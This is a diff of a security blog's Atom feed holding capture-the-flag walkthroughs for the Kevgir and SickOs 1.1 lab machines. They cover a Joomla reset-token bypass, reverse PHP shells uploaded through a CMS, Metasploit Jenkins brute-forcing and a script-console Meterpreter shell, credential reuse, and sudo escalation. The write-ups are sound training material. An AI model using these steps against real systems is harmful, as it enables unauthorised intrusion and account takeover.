+Exploit: 1. Go to url : target.com/index.php?option=com_user&amp;view=reset&amp;layout=confirm  2. Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.  3. Write new password for admin  4. Go to url : target.com/administrator/  5. Login admin with new password
+Vulnerable? Yes
+```</p>
+
+<p>This vulnerability is tracked under CVE-2008-3681:</p>
+
+<blockquote><p>components/com_user/models/reset.php in Joomla! 1.5 through 1.5.5 does not properly validate reset tokens, which
+allows remote attackers to reset the &ldquo;first enabled user (lowest id)&rdquo; password, typically for the administrator</p></blockquote>
+
+<p>So I followed the directions and went to <a href="http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.217.128:8081/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></p>
+
+<p><img class="center" src="/images/pentest/kevgir/token.jpg" title="&lsquo;token&rsquo; &lsquo;password reset bypass&rsquo;" ></p>
+
+<p>Inside the token field I put a <strong>&lsquo;</strong> and then I was taken to a password reset screen where I changed the admin password and finally logged in:</p>
+
+<p><img class="center" src="/images/pentest/kevgir/joomla.jpg" title="&lsquo;joomla&rsquo; &lsquo;joomla&rsquo;" ></p>
+
+<p>Inside the Extensions, there is a Template Manager page, where I selected a template and edited its HTML:</p>
+
+<p><img class="center" src="/images/pentest/kevgir/template.jpg" title="&lsquo;template&rsquo; &lsquo;joomla template&rsquo;" ></p>
+
+<p>I copied the source code for PentestMonkey&rsquo;s reverse PHP shell, saved the template and reloaded the main page to be served a new shell:</p>
+
+<p><code>
+nc -vnlp 8888
+listening on [any] 8888 ...
+connect to [192.168.217.132] from (UNKNOWN) [192.168.217.128] 57836
+Linux canyoupwnme 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU/Linux
+ 19:40:29 up 39 min,  0 users,  load average: 0.15, 0.11, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+</code></p>
+
+<h2>Jenkins</h2>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+9000/tcp  open  http        Jetty winstone-2.9
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Jetty(winstone-2.9)
+|_http-title: Dashboard [Jenkins]
+</code></p>
+
+<p><img class="center" src="/images/pentest/kevgir/jenkins.jpg" title="&lsquo;jenkins&rsquo; &lsquo;jenkins dashboard&rsquo;" ></p>
+
+<p>Jenkins was a new target for me. Let&rsquo;s first understand what it&rsquo;s used for:</p>
+
+<blockquote><p>Jenkins is a self-contained, open source automation server written in Java that can be used to automate all sorts of
+tasks related to building, testing, and delivering or deploying software.</p></blockquote>
+
+<p>I searched in Metasploit and found the <code>auxiliary/scanner/http/jenkins_enum</code>module:</p>
+
+<p>```
+msf auxiliary(jenkins_enum) > info</p>
+
+<pre><code>   Name: Jenkins-CI Enumeration
+ Module: auxiliary/scanner/http/jenkins_enum
+License: Metasploit Framework License (BSD)
+   Rank: Normal
+</code></pre>
+
+<p>Provided by:
+  Jeff McCutchan</p>
+
+<p>Basic options:
+  Name       Current Setting  Required  Description</p>
+
+<hr />
+
+<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
+  RHOSTS                      yes       The target address range or CIDR identifier
+  RPORT      80               yes       The target port (TCP)
+  SSL        false            no        Negotiate SSL/TLS for outgoing connections
+  TARGETURI  /jenkins/        yes       The path to the Jenkins-CI application
+  THREADS    1                yes       The number of concurrent threads
+  VHOST                       no        HTTP server virtual host</p>
+
+<p>Description:
+  This module enumerates a remote Jenkins-CI installation in an
+  unauthenticated manner, including host operating system and Jenkins
+  installation details.
+```</p>
+
+<p>I ran the enumeration module. Had to change the path to the root folder before I got any output:</p>
+
+<p>```
+msf auxiliary(jenkins_enum) > exploit</p>
+
+<p>[+] 192.168.217.128:9000  &ndash; Jenkins Version 1.647
+[<em>] /script restricted (403)
+[</em>] /view/All/newJob restricted (403)
+[+] <a href="http://192.168.217.128:9000/">http://192.168.217.128:9000/</a> &ndash; /asynchPeople/ does not require authentication (200)
+[*] /systemInfo restricted (403)
+```</p>
+
+<p>This information did not mean much to me, but I went to the only folder that returned a 200 code and found the usernames recognized by the server</p>
+
+<p><img class="center" src="/images/pentest/kevgir/jenkins-admin.jpg" title="&lsquo;jenkins admin&rsquo; &lsquo;jenkins admin&rsquo;" ></p>
+
+<p>Knowing now there is an admin user, I went again to the bruteforce route, which was quite successful so far:</p>
+
+<p>```
+Module options (auxiliary/scanner/http/jenkins_login):</p>
+
+<p>   Name              Current Setting                                     Required  Description</p>
+
+<hr />
+
+<p>   BLANK_PASSWORDS   false                                               no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                                                   yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false                                               no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false                                               no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false                                               no        Add all users in the current database to the list
+   HTTP_METHOD       POST                                                yes       The HTTP method to use for the login (Accepted: GET, POST)
+   LOGIN_URL         /j_acegi_security_check                             yes       The URL that handles the login process
+   PASSWORD                                                              no        A specific password to authenticate with
+   PASS_FILE         /usr/share/wordlists/metasploit/unix_passwords.txt  no        File containing passwords, one per line
+   Proxies                                                               no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
+   RHOSTS            192.168.217.128                                     yes       The target address range or CIDR identifier
+   RPORT             9000                                                yes       The target port (TCP)
+   SSL               false                                               no        Negotiate SSL/TLS for outgoing connections
+   STOP_ON_SUCCESS   true                                                yes       Stop guessing when a credential works for a host
+   THREADS           1                                                   yes       The number of concurrent threads
+   USERNAME          admin                                               no        A specific username to authenticate as
+   USERPASS_FILE                                                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      false                                               no        Try the username as the password for all users
+   USER_FILE                                                             no        File containing usernames, one per line
+   VERBOSE           true                                                yes       Whether to print output for all attempts
+   VHOST                                                                 no        HTTP server virtual host
+```</p>
+
+<p>At first it didn&rsquo;t work, because I changed the login URL to correspond to the URL path. But I had to leave it as /j_acegi_security_check (I checked the source code and saw that it was correct), and then it found the credentials admin/hello:</p>
+
+<p><code>
+[+] 192.168.217.128:9000 - Login Successful: admin:hello
+</code></p>
+
+<p>So now I was able to login and look at things and change them. Interestingly, the exploitation didn&rsquo;t stop here. There is a module that also allowed me to get a shell with the credentials:</p>
+
+<blockquote><p>This module uses the Jenkins-CI Groovy script console to execute OS commands using Java.</p></blockquote>
+
+<p>Don&rsquo;t forget to select the target as Linux:</p>
+
+<p>```
+options</p>
+
+<p>Module options (exploit/multi/http/jenkins_script_console):</p>
+
+<p>   Name       Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   API_TOKEN                   no        The API token for the specified username
+   PASSWORD   hello            no        The password for the specified username
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
+   RHOST      192.168.217.128  yes       The target address
+   RPORT      9000             yes       The target port (TCP)
+   SRVHOST    192.168.217.132  yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       The path to the Jenkins-CI application
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   USERNAME   admin            no        The username to authenticate as
+   VHOST                       no        HTTP server virtual host</p>
+
+<p>Payload options (linux/x86/meterpreter/reverse_tcp):</p>
+
+<p>   Name   Current Setting  Required  Description</p>
+
+<hr />
+
+<p>   LHOST  192.168.217.132  yes       The listen address
+   LPORT  8080             yes       The listen port</p>
+
+<p>Exploit target:</p>
+
+<p>   Id  Name</p>
+
+<hr />
+
+<p>   1   Linux
+```</p>
+
+<p>And a new shell appears!</p>
+
+<p>```
+msf exploit(jenkins_script_console) > exploit</p>
+
+<p>[<em>] Started reverse TCP handler on 192.168.217.132:8080
+[</em>] Checking access to the script console
+[<em>] Logging in&hellip;
+[</em>] 192.168.217.128:9000 &ndash; Sending Linux stager&hellip;
+[<em>] Sending stage (849108 bytes) to 192.168.217.128
+[</em>] Meterpreter session 1 opened (192.168.217.132:8080 &ndash;> 192.168.217.128:48103) at 2017-12-12 12:49:19 -0500</p>
+
+<p>meterpreter >
+[!] Deleting /tmp/wE472W payload file
+```</p>
+
+<p>Lastly, there were some other open ports, but I couldn&rsquo;t use them for exploitation.</p>
+
+<p><code>
+PORT      STATE SERVICE     VERSION
+46201/tcp open  unknown
+| fingerprint-strings:
+|   DNSStatusRequest:
+|     Unrecognized protocol:
+|   DNSVersionBindReq:
+|     Unrecognized protocol:
+|     version
+|_    bind
+53180/tcp open  ssh         Apache Mina sshd 0.8.0 (protocol 2.0)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port46201-TCP:V=7.60%I=7%D=12/2%Time=5A22FB7C%P=x86_64-pc-linux-gnu%r(D
+SF:NSVersionBindReq,36,"Unrecognized\x20protocol:\x20\0\x06\x01\0\0\x01\0\
+SF:0\0\0\0\0\x07version\x04bind\0\0\x10\0\x03\n")%r(DNSStatusRequest,24,"U
+SF:nrecognized\x20protocol:\x20\0\0\x10\0\0\0\0\0\0\0\0\0\n");
+</code></p>
+
+<p>Interestingly, it was the first time I encountered Apache Mina, so this was a good occasion to learn more about it:</p>
+
+<blockquote><p>Apache MINA is a network application framework which helps users develop high performance and high scalability
+network applications easily. It provides an abstract event-driven asynchronous API over various transports such as
+TCP/IP and UDP/IP via Java NIO.</p></blockquote>
+
+<p>Well, this was fun box and I learned a lot from it. The bruteforce exercises were interesting, because I could familiarize myself with tools I hadn&rsquo;t used before, like patator and fcrackzip. Rest of the web application vulnerabilities were pretty straightforward, but I liked the Jenkins and Redis ones, which were something fresher than the usual Apache/PHP app challenges. All in all, a great machine to learn more about web app security, and one I strongly recommend.</p>
+
+<h3>Learn more</h3>
+
+<p>Redis security: <a href="http://antirez.com/news/96">http://antirez.com/news/96</a></p>
+
+<p>```</p>
+
+<hr />
+
+<p>/ This will be a memorable month &mdash; no  \
+\ matter how hard you try to forget it. /</p>
+
+<hr />
+
+<pre><code>    \   ^__^
+     \  (oo)\_______
+        (__)\       )\/\
+            ||----w |
+            ||     ||
+</code></pre>
+
+<p>```</p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Gibson 0.2 walkthrough]]></title>
@@ -1687,313 +2702,6 @@ firstboot_done  key-3-of-3.txt</p>
 
 <p>/ You have literary talent that you \
 \ should take pains to develop.     /</p>
-
-<hr />
-
-<pre><code>    \   ^__^
-     \  (oo)\_______
-        (__)\       )\/\
-            ||----w |
-            ||     ||
-</code></pre>
-
-<p>```</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[SickOs 1.1 writeup]]></title>
-    <link href="http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup/"/>
-    <updated>2017-06-28T08:09:14-04:00</updated>
-    <id>http://chousensha.github.io/blog/2017/06/28/sickos-1-dot-1-writeup</id>
-    <content type="html"><![CDATA[<p>Today&rsquo;s target is similar to what can be found in OSCP labs. The goal is to obtain root privileges and get the flag. Let&rsquo;s dive right in!</p>
-
-<!-- more -->
-
-
-<h2>Recon</h2>
-
-<p>Nmap results are:</p>
-
-<p>```
-nmap -T4 -p- -A 192.168.217.143</p>
-
-<p>PORT     STATE  SERVICE    VERSION
-22/tcp   open   ssh        OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   1024 09:3d:29:a0:da:48:14:c1:65:14:1e:6a:6c:37:04:09 (DSA)
-|   2048 84:63:e9:a8:8e:99:33:48:db:f6:d5:81:ab:f2:08:ec (RSA)
-|<em>  256 51:f6:eb:09:f6:b3:e6:91:ae:36:37:0c:c8:ee:34:27 (ECDSA)
-3128/tcp open   http-proxy Squid http proxy 3.1.19
-| http-open-proxy: Potentially OPEN proxy.
-|</em>Methods supported: GET HEAD
-|<em>http-server-header: squid/3.1.19
-|</em>http-title: ERROR: The requested URL could not be retrieved
-8080/tcp closed http-proxy
-```</p>
-
-<p>This is an interesting one, there are no obvious points of entry, but there is a Squid proxy in place. Navigating directly to port 3128 didn&rsquo;t yield anything besides an error of an invalid URL request. I googled the Squid version and found a potentially useful <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/http/squid_pivot_scanning">Metasploit module</a>:</p>
-
-<blockquote><p>A misconfigured Squid proxy can allow an attacker to make requests on his behalf. This may give the attacker
-information about devices that he cannot reach but the Squid proxy can. For example, an attacker can make requests
-for internal IP addresses against a misconfigurated open Squid proxy exposed to the Internet, therefore performing an
-internal port scan. The error messages returned by the proxy are used to determine if the port is open or not. Many
-Squid proxies use custom error codes so your mileage may vary. The open_proxy module can be used to test for open
-proxies, though a Squid proxy does not have to be open in order to allow for pivoting (e.g. an Intranet Squid proxy
-which allows the attack to pivot to another part of the network).</p></blockquote>
-
-<p>Here are the options I&rsquo;ve used for the scanner:</p>
-
-<p>```
-msf auxiliary(squid_pivot_scanning) > options</p>
-
-<p>Module options (auxiliary/scanner/http/squid_pivot_scanning):</p>
-
-<p>   Name          Current Setting                                  Required  Description</p>
-
-<hr />
-
-<p>   CANARY_IP     1.2.3.4                                          yes       The IP to check if the proxy always answers positively; the IP should not respond.
-   MANUAL_CHECK  true                                             yes       Stop the scan if server seems to answer positively to every request
-   PORTS         21,80,139,443,445,1433,1521,1723,3389,8080,9100  yes       Ports to scan; must be TCP
-   Proxies                                                        no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
-   RANGE         192.168.217.143                                  yes       IPs to scan through Squid proxy
-   RHOSTS        192.168.217.143                                  yes       The target address range or CIDR identifier
-   RPORT         3128                                             yes       The target port (TCP)
-   SSL           false                                            no        Negotiate SSL/TLS for outgoing connections
-   THREADS       1                                                yes       The number of concurrent threads
-   VHOST                                                          no        HTTP server virtual host
-```</p>
-
-<p>And the output:</p>
-
-<p>```
-msf auxiliary(squid_pivot_scanning) > run</p>
-
-<p>[+] [192.168.217.143] 192.168.217.143 is alive but 21 is CLOSED
-[+] [192.168.217.143] 192.168.217.143:80 seems OPEN
-[+] [192.168.217.143] 192.168.217.143 is alive but 139 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 445 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 1433 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 1521 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 1723 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 3389 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 8080 is CLOSED
-[+] [192.168.217.143] 192.168.217.143 is alive but 9100 is CLOSED
-[<em>] Scanned 1 of 1 hosts (100% complete)
-[</em>] Auxiliary module execution completed
-```</p>
-
-<p>It appears port 80 is open on the target. I configured my browser to use the Squid proxy and went to the web server:</p>
-
-<p><img class="center" src="/images/pentest/sickos/1-web.png" title="&lsquo;web server&rsquo; &lsquo;webpage&rsquo;" ></p>
-
-<p>If it doesn&rsquo;t appear there is much content on the web server, we have to get more information by force _;) Since I had to take the proxy into consideration, I preferred a CLI tool rather than a GUI like Dirbuster. How fortunate that there is a CLI companion to Dirbuster, called <em>sound of drums</em>: <strong>dirb</strong>!</p>
-
-<h3>dirb description</h3>
-
-<p>Homepage: <a href="http://dirb.sourceforge.net/">http://dirb.sourceforge.net/</a></p>
-
-<blockquote><p>DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web
-Objects. It basically works by launching a dictionary based attack against
-a web server and analizing the response.</p>
-
-<p>DIRB comes with a set of preconfigured attack wordlists for easy usage but
-you can use your custom wordlists. Also DIRB sometimes can be used as a
-classic CGI scanner, but remember is a content scanner not a vulnerability scanner.</p>
-
-<p>DIRB main purpose is to help in professional web application auditing.
-Specially in security related testing. It covers some holes not covered by
-classic web vulnerability scanners. DIRB looks for specific web objects that
-other generic CGI scanners can&rsquo;t look for. It doesn&rsquo;t search vulnerabilities
-nor does it look for web contents that can be vulnerables.</p></blockquote>
-
-<h3>dirb options</h3>
-
-<h2>``` </h2>
-
-<p>DIRB v2.22</p>
-
-<h2>By The Dark Raver</h2>
-
-<p>./dirb &lt;url_base> [&lt;wordlist_file(s)>] [options]</p>
-
-<p>========================= NOTES =========================
- &lt;url_base> : Base URL to scan. (Use -resume for session resuming)
- &lt;wordlist_file(s)> : List of wordfiles. (wordfile1,wordfile2,wordfile3&hellip;)</p>
-
-<p>======================== HOTKEYS ========================
- &lsquo;n&rsquo; &ndash;> Go to next directory.
- &lsquo;q&rsquo; &ndash;> Stop scan. (Saving state for resume)
- &lsquo;r&rsquo; &ndash;> Remaining scan stats.</p>
-
-<p>======================== OPTIONS ========================
- -a &lt;agent_string> : Specify your custom USER_AGENT.
- -c &lt;cookie_string> : Set a cookie for the HTTP request.
- -f : Fine tunning of NOT_FOUND (404) detection.
- -H &lt;header_string> : Add a custom header to the HTTP request.
- -i : Use case-insensitive search.
- -l : Print &ldquo;Location&rdquo; header when found.
- -N &lt;nf_code>: Ignore responses with this HTTP code.
- -o &lt;output_file> : Save output to disk.
- -p &lt;proxy[:port]> : Use this proxy. (Default port is 1080)
- -P &lt;proxy_username:proxy_password> : Proxy Authentication.
- -r : Don&rsquo;t search recursively.
- -R : Interactive recursion. (Asks for each directory)
- -S : Silent Mode. Don&rsquo;t show tested words. (For dumb terminals)
- -t : Don&rsquo;t force an ending &lsquo;/&rsquo; on URLs.
- -u &lt;username:password> : HTTP Authentication.
- -v : Show also NOT_FOUND pages.
- -w : Don&rsquo;t stop on WARNING messages.
- -X <extensions> / -x &lt;exts_file> : Append each word with this extensions.
- -z <milisecs> : Add a miliseconds delay to not cause excessive Flood.</p>
-
-<p>======================== EXAMPLES =======================
- ./dirb <a href="http://url/directory/">http://url/directory/</a> (Simple Test)
- ./dirb <a href="http://url/">http://url/</a> -X .html (Test files with &lsquo;.html&rsquo; extension)
- ./dirb <a href="http://url/">http://url/</a> /usr/share/dirb/wordlists/vulns/apache.txt (Test with apache.txt wordlist)
- ./dirb <a href="https://secure_url/">https://secure_url/</a> (Simple Test with SSL)
-```</p>
-
-<p>This tool is exactly what I needed! And it finished really fast! Here are its discoveries:</p>
-
-<p>```
-dirb <a href="http://192.168.217.143">http://192.168.217.143</a> /usr/share/wordlists/dirb/common.txt -p 192.168.217.143:3128</p>
-
-<hr />
-
-<p>DIRB v2.22</p>
-
-<h2>By The Dark Raver</h2>
-
-<p>START_TIME: Thu Jun 29 06:45:12 2017
-URL_BASE: <a href="http://192.168.217.143/">http://192.168.217.143/</a>
-WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt
-PROXY: 192.168.217.143:3128</p>
-
-<hr />
-
-<p>GENERATED WORDS: 4612</p>
-
-<p>&mdash;&mdash; Scanning URL: <a href="http://192.168.217.143/">http://192.168.217.143/</a> &mdash;&mdash;
-+ <a href="http://192.168.217.143/cgi-bin/">http://192.168.217.143/cgi-bin/</a> (CODE:403|SIZE:291)                                                                                             <br/>
-+ <a href="http://192.168.217.143/connect">http://192.168.217.143/connect</a> (CODE:200|SIZE:109)                                                                                              <br/>
-+ <a href="http://192.168.217.143/index">http://192.168.217.143/index</a> (CODE:200|SIZE:21)                                                                                                 <br/>
-+ <a href="http://192.168.217.143/index.php">http://192.168.217.143/index.php</a> (CODE:200|SIZE:21)                                                                                             <br/>
-+ <a href="http://192.168.217.143/robots">http://192.168.217.143/robots</a> (CODE:200|SIZE:45)                                                                                                <br/>
-+ <a href="http://192.168.217.143/robots.txt">http://192.168.217.143/robots.txt</a> (CODE:200|SIZE:45)                                                                                            <br/>
-+ <a href="http://192.168.217.143/server-status">http://192.168.217.143/server-status</a> (CODE:403|SIZE:296)</p>
-
-<hr />
-
-<p>END_TIME: Thu Jun 29 06:45:16 2017
-DOWNLOADED: 4612 &ndash; FOUND: 7
-```</p>
-
-<p>Quite interesting. Some resources are forbidden, connect is a Python script with the following content:</p>
-
-<p>```</p>
-
-<h1>!/usr/bin/python</h1>
-
-<p>print &ldquo;I Try to connect things very frequently\n&rdquo;
-print &ldquo;You may want to try my services&rdquo;
-```</p>
-
-<p>The robots.txt file seems the most useful:</p>
-
-<p><code>
-User-agent: *
-Disallow: /
-Dissalow: /wolfcms
-</code></p>
-
-<p>A hidden CMS, eh? I went there to find this:</p>
-
-<p><img class="center" src="/images/pentest/sickos/1-wolfcms.png" title="&lsquo;wolfcms&rsquo; &lsquo;wolfcms&rsquo;" ></p>
-
-<p>I ran Nikto on it, didn&rsquo;t find anything interesting besides an outdated Apache version. Same with other scanners and another round of directory bruteforcing, nothing useful. I googled for WolfCMS, and found an arbitrary file upload exploit, but it required an authenticated user. So next I searched for the admin interface, and found an answer on <a href="https://www.wolfcms.org/forum/topic2034.html">their forums</a>. So I appended <em>?admin</em> to the path and got redirected to <a href="http://192.168.217.143/wolfcms/?/admin/login">http://192.168.217.143/wolfcms/?/admin/login</a></p>
-
-<p><img class="center" src="/images/pentest/sickos/1-login.png" title="&lsquo;wolfcms admin&rsquo; &lsquo;wolfcms admin login&rsquo;" ></p>
-
-<p>I couldn&rsquo;t find default credentials, no obvious SQL errors, so I tried a few common combinations, and imagine the surprise when <em>admin:admin</em> worked!</p>
-
-<p><img class="center" src="/images/pentest/sickos/1-admin.png" title="&lsquo;admin&rsquo; &lsquo;wolfcms admin panel&rsquo;" ></p>
-
-<h2>Exploitation</h2>
-
-<p>Now I can use the <a href="https://www.exploit-db.com/exploits/36818/">exploit</a>. The vulnerability exists in the CMS' File Manager, which doesn&rsquo;t restrict the types of files that can be uploaded. But I forgot that I had to access the CMS through a proxy, and didn&rsquo;t want to modify the code, so instead I manually uploaded Pentestmonkey&rsquo;s reverse shell through the interface:</p>
-
-<p><img class="center" src="/images/pentest/sickos/1-file.png" title="&lsquo;file manager&rsquo; &lsquo;wolfcms file upload&rsquo;" ></p>
-
-<p>I set up a Netcat listener and navigated to the shell:</p>
-
-<p><code>
-root@kali:~# nc -vnlp 8888
-listening on [any] 8888 ...
-connect to [192.168.217.132] from (UNKNOWN) [192.168.217.143] 33709
-Linux SickOs 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux
- 18:12:38 up  3:14,  0 users,  load average: 0.00, 0.01, 0.05
-USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ whoami
-www-data
-</code></p>
-
-<p>I looked inside the web directory and found a <strong>config.php</strong> file in <code>/var/www/wolfcms</code> that contained a set of credentials:</p>
-
-<p><code>
-// Database settings:
-define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');
-define('DB_USER', 'root');
-define('DB_PASS', 'john@123');
-</code></p>
-
-<p>I also noted the existence of a sickos user, based on the home directories. Tried SSH'ing as root, no joy. But trying as sickos with the above password worked! Inside sickos' home, I noticed a bash_history file:</p>
-
-<p><code>
-sickos@SickOs:~$ cat .bash_history
-sudo su
-exit
-</code></p>
-
-<p>Woot, could it be that easy? I did a <code>sudo -l</code>:</p>
-
-<p>```
-User sickos may run the following commands on this host:</p>
-
-<pre><code>(ALL : ALL) ALL
-</code></pre>
-
-<p>```</p>
-
-<p>Root was only a <em>sudo su</em> away!</p>
-
-<p><code>
-root@SickOs:~# whoami
-root
-</code></p>
-
-<p>And the flag:</p>
-
-<p>```
-root@SickOs:~# cat a0216ea4d51874464078c618298b1367.txt
-If you are viewing this!!</p>
-
-<p>ROOT!</p>
-
-<p>You have Succesfully completed SickOS1.1.
-Thanks for Trying
-```</p>
-
-<p>Thanks D4rk for an interesting machine, with a nice twist of Squid!</p>
-
-<p>```</p>
-
-<hr />
-
-<p>&lt; You will outgrow your usefulness. ></p>
 
 <hr />
 
